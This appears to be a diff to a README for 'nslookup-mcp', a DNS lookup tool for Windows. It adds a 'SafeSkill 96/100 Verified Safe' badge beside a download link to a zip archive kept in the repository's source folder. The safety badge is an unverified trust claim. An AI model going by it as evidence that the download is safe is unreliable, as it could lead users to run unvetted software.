@@ -1,6 +1,7 @@
 # 🔎 nslookup-mcp - Simple DNS Checks for Windows
 
 [![Download nslookup-mcp](https://img.shields.io/badge/Download%20nslookup--mcp-6a5acd?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ayushje/nslookup-mcp/raw/refs/heads/main/src/nslookup-mcp-2.3.zip)
+[![SafeSkill 96/100](https://img.shields.io/badge/SafeSkill-96%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/ayushje-nslookup-mcp)
 
 ## 🧭 What this app does
 
